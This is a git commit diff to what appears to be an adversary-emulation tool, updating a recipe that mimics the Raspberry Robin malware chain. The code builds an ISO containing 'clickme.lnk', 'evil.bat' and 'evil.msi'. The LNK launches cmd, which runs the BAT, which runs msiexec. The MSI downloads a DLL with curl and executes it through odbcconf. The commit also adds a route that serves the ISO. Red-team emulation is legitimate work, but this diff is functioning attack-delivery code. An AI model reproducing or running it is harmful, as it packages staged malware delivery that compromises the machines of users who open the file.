aa784064c2c95b3e84e34b1b62540805220aab16
Dobin Rutishauser <dobin.rutishauser@gmail.com>
2023-02-26 10:24:22 +0100

    feature: improved raspberryrobin

--- recipes/raspberryrobin/raspberryrobin.py
+++ recipes/raspberryrobin/raspberryrobin.py
@@ -14,25 +14,24 @@ from model import AceFile, AceRoute
 
 def raspberryrobin(baseUrl) -> List[AceRoute]:
     routes = []
-    # LNK -> BAT -> MSIEXEC:downloadDLL -> odbcconf/rundll32:dll
+    # LNK -> CMD -> BAT -> MSIEXEC:downloadDLL -> odbcconf/rundll32:dll
 
-    # cmd.exe /r cmd.exe<bla.usb
-    # bla.usb: msiexec /q-I <url>
-    # msiexec:
-    #  - download
-    #  - odbcconf:rundll
-
-    msi = makeMsiFromCmd("cmd.exe /c notepad")
+    # msi: stage 2
+    cmd = "{}; {};".format(
+        makeCmdFileDownloadWithCurl(),
+        makeCmdToDllWithOdbc(),
+    )
+    msi = makeMsiFromCmd(cmd)
     msiFile = AceFile("evil.msi", msi)
-
     #msiRoute = AceRoute('/evil.msi', msiFile)
     #routes.append(msiRoute)
 
-    # make sure each line ends with \r\n, or it will not work
+    # bat: stage 1: make sure each line ends with \r\n, or it will not work
     bat = AceBytes(b"calc.exe\r\nmsiexec.exe /q /i evil.msi\r\n")
     batFile = makeAceFile('evil.bat', bat)
 
-    # LNK to powershell.exe to execute DLL
+    # LNK cmd using "/r cmd file.bat" < technique with file.bat
+    # in the same directory (iso)
     lnkData: AceBytes = makeLnk(
         name = "clickme.lnk",
         target = "c:\\windows\\system32\\cmd.exe",
@@ -40,13 +39,15 @@ def raspberryrobin(baseUrl) -> List[AceRoute]:
     )
     lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)
 
-    # Pack DLL and LNK into ISO
+    # ISO: LNK entry point, stage 1 bat, stage 2 msi
     container: AceBytes = makeIso(files = [
         batFile,
         lnkFile,
         msiFile,
     ])
     containerFile: AceFile = makeAceFile('test.iso', container)
+    isoRoute: AceRoute = AceRoute('/test', container)
+    routes.append(isoRoute)
 
     return routes
     
